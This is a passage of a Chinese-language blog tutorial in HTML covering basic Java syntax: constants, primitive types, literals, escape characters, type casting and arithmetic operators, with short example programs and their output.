</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span>  <span class="title">main</span> <span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span> (m&lt;<span class="number">10</span>) &#123;</span><br><span class="line">            System.out.println(m+<span class="string">"&lt;10"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="空百"><a href="#空百" class="headerlink" title="空百"></a>空百</h3><blockquote><h3 id="java源码中需要有空白，空白数不限。"><a href="#java源码中需要有空白，空白数不限。" class="headerlink" title="java源码中需要有空白，空白数不限。"></a>java源码中需要有空白，空白数不限。</h3></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (m&lt;<span class="number">10</span>) &#123;</span><br><span class="line">    System.out.println(m+<span class="string">"&lt;10"</span>);</span><br><span class="line">&#125;</span><br><span class="line">等于</span><br><span class="line">        <span class="keyword">if</span> (m&lt;<span class="number">10</span>) &#123;</span><br><span class="line">    System.out.println(m+<span class="string">"&lt;10"</span>);&#125;</span><br><span class="line">等于</span><br><span class="line">        <span class="keyword">if</span> (m&lt;<span class="number">10</span>) </span><br><span class="line">        &#123;</span><br><span class="line">    System.out.println(m+<span class="string">"&lt;10"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><blockquote><h3 id="常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final-数据类型-变量名-初始值"><a href="#常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final-数据类型-变量名-初始值" class="headerlink" title="常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final 数据类型 变量名 = 初始值"></a>常量事实上是那些不可修改的变量，常量和变量类似都需要被初始化。在声明常量的同时需要赋予初始值，常量一旦被初始化就不能被修改。final 数据类型 变量名 = 初始值</h3></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">constant</span> </span>&#123;</span><br><span class="line"><span class="comment">//    静态常量，替代const</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">final</span>  <span class="keyword">double</span> PI = <span class="number">3.14</span>;</span><br><span class="line"><span class="comment">//    声明成员常量</span></span><br><span class="line">    <span class="keyword">final</span>  <span class="keyword">int</span> y = <span class="number">2</span>;</span><br><span class="line"><span class="comment">//    声明局部常量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span>  <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">final</span>  <span class="keyword">double</span> pi = <span class="number">3.14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h3><blockquote><h3 id="基本数据类型分为4大类，8种数据类型。"><a href="#基本数据类型分为4大类，8种数据类型。" class="headerlink" title="基本数据类型分为4大类，8种数据类型。"></a>基本数据类型分为4大类，8种数据类型。</h3><ul><li><h4 id="整数类型：byte-long-int-short"><a href="#整数类型：byte-long-int-short" class="headerlink" title="整数类型：byte,long,int,short"></a>整数类型：byte,long,int,short</h4></li><li><h4 id="浮点类型：float-double"><a href="#浮点类型：float-double" class="headerlink" title="浮点类型：float,double"></a>浮点类型：float,double</h4></li><li><h4 id="字符类型：char"><a href="#字符类型：char" class="headerlink" title="字符类型：char"></a>字符类型：char</h4></li><li><h4 id="布尔类型：boolean"><a href="#布尔类型：boolean" class="headerlink" title="布尔类型：boolean"></a>布尔类型：boolean</h4></li></ul></blockquote><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><blockquote><h4 id="byte-long-int-short。它们的区别仅仅在于宽度和范围不同。Java的整数都是有符号的。"><a href="#byte-long-int-short。它们的区别仅仅在于宽度和范围不同。Java的整数都是有符号的。" class="headerlink" title="byte,long,int,short。它们的区别仅仅在于宽度和范围不同。Java的整数都是有符号的。"></a>byte,long,int,short。它们的区别仅仅在于宽度和范围不同。Java的整数都是有符号的。</h4><table><thead><tr><th align="center">整数类型</th><th align="center">宽度</th><th align="center">范围</th></tr></thead><tbody><tr><td align="center">byte</td><td align="center">1个字节(8位)</td><td align="center">-128~127</td></tr><tr><td align="center">int</td><td align="center">4个字节</td><td align="center">-2^{31} ~ 2^{31} -1</td></tr><tr><td align="center">short</td><td align="center">2个字节</td><td align="center">-2^{15} ~ 2^{15}-1</td></tr><tr><td align="center">long</td><td align="center">8个字节</td><td align="center">-2^{63} ~2^{63}-1</td></tr></tbody></table></blockquote><h4 id="Java默认的整数类型为int-long类型需要在后面添加l或者L"><a href="#Java默认的整数类型为int-long类型需要在后面添加l或者L" class="headerlink" title="Java默认的整数类型为int.long类型需要在后面添加l或者L."></a>Java默认的整数类型为int.long类型需要在后面添加l或者L.</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shaping</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"默认整数常量 ="</span>+<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">byte</span> a = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">short</span> b = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">long</span> d = <span class="number">16L</span>;</span><br><span class="line">        <span class="keyword">long</span> e = <span class="number">16l</span>;</span><br><span class="line">        System.out.println(<span class="string">"byte整数 = "</span>+a);</span><br><span class="line">        System.out.println(<span class="string">"Short整数 = "</span>+b);</span><br><span class="line">        System.out.println(<span class="string">"int整数 = "</span>+c);</span><br><span class="line">        System.out.println(<span class="string">"long整数 = "</span>+d);</span><br><span class="line">        System.out.println(<span class="string">"long整数 = "</span>+e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">默认整数常量 =16</span><br><span class="line">byte整数 = 16</span><br><span class="line">Short整数 = 16</span><br><span class="line">int整数 = 16</span><br><span class="line">long整数 = 16</span><br><span class="line">long整数 = 16</span><br><span class="line">```  </span><br><span class="line">### 浮点类型</span><br><span class="line">&gt;  浮点类型主要用来储存小数数值，也可以用来储存范围较大的整数。它分为浮点数(float)和双精度浮点数(double)。双精度浮点数比浮点数使用的内存空间多，可以表示数字范围和精确度比较大。</span><br><span class="line">|浮点类型|宽度|</span><br><span class="line">|:------:|:------:|</span><br><span class="line">|float|4个字节|</span><br><span class="line">|doble|8个字节|</span><br><span class="line">```java</span><br><span class="line">package basic_grammar;</span><br><span class="line"></span><br><span class="line">import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;</span><br><span class="line"></span><br><span class="line">public class Floating_point_number &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(&quot;默认浮点数 =&quot;+366.66);</span><br><span class="line">        float floatnum = 123.23f;</span><br><span class="line">        double doublenum = 456.12;</span><br><span class="line">        final  double PI = 3.1415926d;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;float  =&quot;+floatnum);</span><br><span class="line">        System.out.println(&quot;double =&quot;+doublenum);</span><br><span class="line">        System.out.println(&quot;PI =&quot;+PI);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p> 浮点数默认是double类型，float浮点常数类型需要在数值后面添加f或者F。double浮点数也可以在后面添加d或者D。</p><h2 id="数字表示方式"><a href="#数字表示方式" class="headerlink" title="数字表示方式"></a>数字表示方式</h2><h3 id="进制数表示"><a href="#进制数表示" class="headerlink" title="进制数表示"></a>进制数表示</h3><ul><li>二进制数：以0b或0B为前缀。</li><li>八进制数：以0位前缀。</li><li>十六进制数：以0x或0X为前缀。<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int decimalint = 28;</span><br><span class="line">int binaryint1 = 0b11100;</span><br><span class="line">int binaryint2 = 0B111100;</span><br><span class="line">int octalint = 034;</span><br><span class="line">int hexadecimalint1 = 0x1C;</span><br><span class="line">int hexadecimalint2 = 0X1C;</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="指数表示"><a href="#指数表示" class="headerlink" title="指数表示"></a>指数表示</h3><blockquote><p>  如果需要采用十进制来表示指数，需要使用大写或小写e来表示。e2 = 10^2</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">double myMoney = 3.36e2;</span><br><span class="line">double interestRate = 1.56e-2;</span><br></pre></td></tr></table></figure></div><p> 3.36e2 = 3.36x10^2,1.56e-2 = 1.56x10^-2</p><h3 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h3><blockquote><p> 字符类型表示单个字符。java中以char来声明字符类型，字符类型必须以单引号括起里的单个字符。<br>  java字符采用双字节Unicode编码，占两个字节。可以用十六进制编码形式表示、</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">character</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c1 = <span class="string">'A'</span>;</span><br><span class="line">        <span class="keyword">char</span> c2 = <span class="string">'\u0041'</span>;</span><br><span class="line">        <span class="keyword">char</span> c3 = <span class="string">'华'</span>;</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A</span><br><span class="line">A</span><br><span class="line">华</span><br></pre></td></tr></table></figure></div><p>java为了表示一些特殊字符，需要加上反斜杠(\n)，被称之为转义字符。<br>|字符表示|Unicode编码|说明|<br>|:——:|:——-:|:——:|<br>|\t|\u0009|tab|<br>|\n|\u000a|换行|<br>|\r|\u000d|回车|<br>|&quot;|\u0022|双引号|<br>|&#39;|\u0027|单引号|<br>|\ |\u005c|反斜线|</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">character2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String tab1 = <span class="string">"Hello\tWorld"</span>;</span><br><span class="line">        String tab2 = <span class="string">"Hello\u0009World"</span>;</span><br><span class="line">        String Wrap1 = <span class="string">"Hello\nWorld"</span>;</span><br><span class="line">        String  enter1 = <span class="string">"Hello\rWorld"</span>;</span><br><span class="line">        String Double_quotes1 = <span class="string">"Hello\"World"</span>;</span><br><span class="line">        String apostrophe1 = <span class="string">"Hello\'World"</span>;</span><br><span class="line">        String Backslash1 = <span class="string">"Hello\\World"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"Tab1 : "</span>+tab1);</span><br><span class="line">        System.out.println(<span class="string">"Tab2 : "</span>+tab2);</span><br><span class="line">        System.out.println(<span class="string">"Wrap1 : "</span>+Wrap1);</span><br><span class="line">        System.out.println(<span class="string">"Enter1 : "</span>+enter1);</span><br><span class="line">        System.out.println(<span class="string">"Double_quotes1 : "</span>+Double_quotes1);</span><br><span class="line">        System.out.println(<span class="string">"apostrophe1 : "</span>+apostrophe1);</span><br><span class="line">        System.out.println(<span class="string">"Backslash1 : "</span>+Backslash1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Tab1 : Hello    World</span><br><span class="line">Tab2 : Hello    World</span><br><span class="line">Wrap1 : Hello</span><br><span class="line">World</span><br><span class="line">World1 : Hello</span><br><span class="line">Double_quotes1 : Hello&quot;World</span><br><span class="line">apostrophe1 : Hello&apos;World</span><br><span class="line">Backslash1 : Hello\World</span><br></pre></td></tr></table></figure></div><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><blockquote><p> java中声明布尔类型的关键字是boolean。不能用0或1来代替，因为不属于数值类型，不能与数字类型等进行转换。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">boolean isMan = true;</span><br><span class="line">boolean isWoman = false;</span><br></pre></td></tr></table></figure></div><h2 id="数值类型相互转换"><a href="#数值类型相互转换" class="headerlink" title="数值类型相互转换"></a>数值类型相互转换</h2><h3 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h3><blockquote><p> 自动类型转换就是需要类型之间转换是自动的，不需要任何操作手段。<br><a href="https://image.kalifun.top/temp/1901/1e4ed96f6a3c8f6f.png" target="_blank" rel="noopener"><img src="https://image.kalifun.top/temp/1901/1e4ed96f6a3c8f6f.png" alt></a><br>char可以自动转换为int，long，float，double。但是byte，short不能自动转换为char，且char不能转换为byte，short类型。</p></blockquote><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><blockquote><p> 强制类型转换是在变量或常量前加上（目标类型）实现。强制类型转换主要是用于大宽度类型转换为小宽度类型。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i = 1;</span><br><span class="line">byte b = (byte)i;</span><br></pre></td></tr></table></figure></div><h3 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h3><blockquote><p> 在Java中除了8中数据类型外，其他数据类型都是引用数据类型。引用数据类型用了表示复杂数据类型。包含：类，接口和数组声明的类型。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> y = x;</span><br><span class="line"></span><br><span class="line">String str1 = <span class="string">"Hello"</span>;</span><br><span class="line">String str2 = str1;     <span class="comment">//此时str1和str2指向相同地址</span></span><br><span class="line">str2 = <span class="string">"world"</span>;      <span class="comment">//此时str1和str2指向不同的地址</span></span><br></pre></td></tr></table></figure></div><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><h3 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符"></a>一元运算符</h3><blockquote><h4 id="一元运算符有三种。-，-，–"><a href="#一元运算符有三种。-，-，–" class="headerlink" title="一元运算符有三种。-，++，–"></a>一元运算符有三种。-，++，–</h4><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">说明</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">-</td><td align="center">取反符号</td><td align="center">取反运算</td><td align="center">b=-a</td></tr><tr><td align="center">++</td><td align="center">自加一</td><td align="center">先取值在加一，或先加一再取值</td><td align="center">a++或++a</td></tr><tr><td align="center">–</td><td align="center">自减一</td><td align="center">先取值再减一，或先减一再取值</td><td align="center">a–或–a</td></tr></tbody></table></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Operator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        System.out.println(-a);</span><br><span class="line">        <span class="keyword">int</span> b = a++;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        <span class="keyword">int</span> c = ++b;</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        <span class="keyword">int</span> d = c--;</span><br><span class="line">        System.out.println(d);</span><br><span class="line">        <span class="keyword">int</span> e = --d;</span><br><span class="line">        System.out.println(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-10</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">11</span><br><span class="line">10</span><br></pre></td></tr></table></figure></div><h3 id="二元运算符"><a href="#二元运算符" class="headerlink" title="二元运算符　　"></a>二元运算符　　</h3><blockquote><p>　二元运算符包括：+，- , * , / 和 %。这些对数值类型都是有效的。  </p></blockquote><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">说明</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加</td><td align="center">求和，字符串相连</td><td align="center">a+b</td></tr><tr><td align="center">-</td><td align="center">减</td><td align="center">求差</td><td align="center">a-b</td></tr><tr><td align="center">*</td><td align="center">乘</td><td align="center">求积</td><td align="center">a*b</td></tr><tr><td align="center">/</td><td align="center">除</td><td align="center">求商</td><td align="center">a/b</td></tr><tr><td align="center">%</td><td align="center">取余</td><td align="center">求余</td><td align="center">a%b</td></tr><tr><td align="center"><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Binary</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> charnum = <span class="string">'A'</span>;</span><br><span class="line">        <span class="keyword">int</span> intresult = charnum + <span class="number">1</span> ;</span><br><span class="line">        System.out.println(intresult);</span><br><span class="line">        intresult = intresult - <span class="number">1</span>;</span><br><span class="line">        System.out.println(intresult);</span><br><span class="line">        intresult = intresult * <span class="number">2</span> ;</span><br><span class="line">        System.out.println(intresult);</span><br><span class="line">        intresult = intresult / <span class="number">2</span> ;</span><br><span class="line">        System.out.println(intresult);</span><br><span class="line">        intresult = intresult + <span class="number">8</span> ;</span><br><span class="line">        intresult = intresult % <span class="number">7</span> ;</span><br><span class="line">        System.out.println(intresult);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> doubleresult = <span class="number">10.0</span>;</span><br><span class="line">        System.out.println(doubleresult);</span><br><span class="line"></span><br><span class="line">        doubleresult = doubleresult + <span class="number">1</span> ;</span><br><span class="line">        System.out.println(doubleresult);</span><br><span class="line">        </span><br><span class="line">        doubleresult = doubleresult -<span class="number">1</span> ;</span><br><span class="line">        System.out.println(doubleresult);</span><br><span class="line"></span><br><span class="line">        doubleresult = doubleresult * <span class="number">2</span> ;</span><br><span class="line">        System.out.println(doubleresult);</span><br><span class="line"></span><br><span class="line">        doubleresult = doubleresult / <span class="number">2</span> ;</span><br><span class="line">        System.out.println(doubleresult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">66</span><br><span class="line">65</span><br><span class="line">130</span><br><span class="line">65</span><br><span class="line">3</span><br><span class="line">10.0</span><br><span class="line">11.0</span><br><span class="line">10.0</span><br><span class="line">20.0</span><br><span class="line">10.0</span><br></pre></td></tr></table></figure></div><h3 id="算术赋值运算符"><a href="#算术赋值运算符" class="headerlink" title="算术赋值运算符"></a>算术赋值运算符</h3><table><thead><tr><th align="center">运算符</th><th align="center">名称</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">+=</td><td align="center">加赋值</td><td align="center">a+=b</td></tr><tr><td align="center">-=</td><td align="center">减赋值</td><td align="center">a-=b</td></tr><tr><td align="center">*=</td><td align="center">乘赋值</td><td align="center">a*=b</td></tr><tr><td align="center">/=</td><td align="center">除赋值</td><td align="center">a/=b</td></tr><tr><td align="center">%=</td><td align="center">取余赋值</td><td align="center">a%=b</td></tr><tr><td align="center"><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">arithmetic</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">        a += b;   <span class="comment">//a = a+b</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        a += b + <span class="number">2</span> ; <span class="comment">//a = a +b +2</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        a -= b;  <span class="comment">//a = a-b</span></span><br><span 